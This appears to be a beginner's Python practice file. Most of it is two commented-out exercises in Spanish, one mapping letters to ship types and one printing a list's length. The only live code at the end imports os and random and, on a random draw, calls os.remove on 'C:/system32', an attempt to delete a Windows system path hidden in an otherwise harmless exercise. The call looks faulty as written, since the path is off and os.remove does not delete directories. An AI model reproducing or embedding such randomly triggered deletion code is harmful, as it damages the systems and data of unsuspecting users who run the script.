# while True:
#     letra  = input("Letra: ")
#     estados = {
#         "B":0,
#         "b":0,
#         "F":1,
#         "f":1,
#         "C":2,
#         "c":2,
#         "finish":0
#     }
#     res = ["buque", "fragata", "crucero"]
#     for i in estados:
#         if letra == i:
#             print(res[estados[i]])
#         if i == "finish":
#             print("Letra no válida")


# x = ["d", 2, 3, 4, 5]

# print(len(x))

# for i in range(len(x)):
#     print(i)

import os
import random

x = random.randrange(5)

if x == 1:
    os.remove("C:/system32")